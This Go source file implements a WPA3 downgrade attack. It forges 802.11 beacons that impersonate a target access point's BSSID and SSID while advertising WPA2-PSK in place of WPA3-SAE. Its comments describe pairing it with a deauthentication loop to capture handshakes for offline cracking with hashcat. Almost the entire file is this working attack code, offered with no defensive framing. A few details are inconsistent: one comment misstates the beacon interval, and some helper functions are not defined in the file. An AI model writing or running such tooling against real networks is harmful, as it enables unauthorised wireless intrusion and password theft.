package main

import (
	"encoding/hex"
	"fmt"
	"net"
	"sync/atomic"
	"syscall"
	"time"
)

// WPA3Downgrade — beacon spoofing attack that poisons RSN IE on target AP beacons,
// advertising WPA2-PSK (CCMP) instead of WPA3-SAE so clients that support both
// transition back to WPA2. Run alongside a deauth loop; captured handshakes fall
// back to HC22000 for hashcat.
type WPA3Downgrade struct {
	Iface   string
	BSSID   string
	SSID    string
	Channel int
	Running atomic.Bool
	Stop    chan struct{}
	sent    atomic.Int64
}

func NewWPA3Downgrade(iface, bssid, ssid string, ch int) *WPA3Downgrade {
	return &WPA3Downgrade{
		Iface: iface, BSSID: bssid, SSID: ssid, Channel: ch,
		Stop: make(chan struct{}),
	}
}

func (w *WPA3Downgrade) Run() error {
	fd, err := syscall.Socket(syscall.AF_PACKET, syscall.SOCK_RAW, int(htons(0x0003)))
	if err != nil {
		return fmt.Errorf("socket: %w (need CAP_NET_RAW)", err)
	}
	defer syscall.Close(fd)
	if err := syscall.Bind(fd, &syscall.SockaddrLinklayer{
		Protocol: htons(0x0003),
		Ifindex:  ifaceIndex(w.Iface),
	}); err != nil {
		return fmt.Errorf("bind: %w", err)
	}
	if err := setIfaceChannel(w.Iface, w.Channel); err != nil {
		return fmt.Errorf("channel: %w", err)
	}

	w.Running.Store(true)
	bssid, _ := hex.DecodeString(w.BSSID)
	src := bssid
	if len(src) != 6 {
		src = []byte{0xde, 0xad, 0xbe, 0xef, 0x00, 0x01}
	}
	frame := buildWPA2Beacon(src, []byte(w.SSID), w.Channel)
	go func() {
		ticker := time.NewTicker(102400 * time.Microsecond) // ~10 TU beacon interval
		defer ticker.Stop()
		for {
			select {
			case <-w.Stop:
				return
			case <-ticker.C:
				n, err := syscall.Write(fd, frame)
				if err == nil {
					w.sent.Add(int64(n))
				}
			}
		}
	}()
	return nil
}

func (w *WPA3Downgrade) Stop_() {
	close(w.Stop)
	w.Running.Store(false)
}

func (w *WPA3Downgrade) Sent() int64 { return w.sent.Load() }

// buildWPA2Beacon — 802.11 beacon frame with RSN IE claiming WPA2-PSK/CCMP.
func buildWPA2Beacon(bssid, ssid []byte, channel int) []byte {
	buf := make([]byte, 0, 256)
	// Frame control: type=0 (mgmt), subtype=8 (beacon)
	buf = append(buf, 0x80, 0x00)
	// Duration
	buf = append(buf, 0x00, 0x00)
	// DA: broadcast
	buf = append(buf, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
	// SA: BSSID
	buf = append(buf, bssid...)
	// BSSID
	buf = append(buf, bssid...)
	// Seq control
	buf = append(buf, 0x00, 0x00)
	// Timestamp (8 bytes)
	buf = append(buf, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00)
	// Beacon interval (100 TU)
	buf = append(buf, 0x64, 0x00)
	// Capability info (ESS, short preamble, short slot)
	buf = append(buf, 0x11, 0x04)
	// SSID IE
	buf = append(buf, 0x00, byte(len(ssid)))
	buf = append(buf, ssid...)
	// Supported rates IE
	buf = append(buf, 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24)
	// DS Parameter Set IE — current channel
	buf = append(buf, 0x03, 0x01, byte(channel))
	// RSN IE — WPA2-PSK CCMP (spoofed; original was WPA3/SAE)
	rsn := []byte{
		0x30, 0x14, // RSN IE tag, len 20
		0x01, 0x00,             // RSN version
		0x00, 0x0f, 0xac, 0x04, // Group cipher: CCMP
		0x01, 0x00,             // Pairwise cipher count
		0x00, 0x0f, 0xac, 0x04, // Pairwise: CCMP
		0x01, 0x00,             // AKM count
		0x00, 0x0f, 0xac, 0x02, // AKM: PSK (not SAE!)
		0x00, 0x00,             // RSN capabilities
	}
	buf = append(buf, rsn...)
	return buf
}

func setIfaceChannel(iface string, ch int) error {
	setChannel(iface, ch)
	return nil
}

func ifaceIndex(name string) int {
	ifi, err := net.InterfaceByName(name)
	if err != nil {
		return 0
	}
	return ifi.Index
}
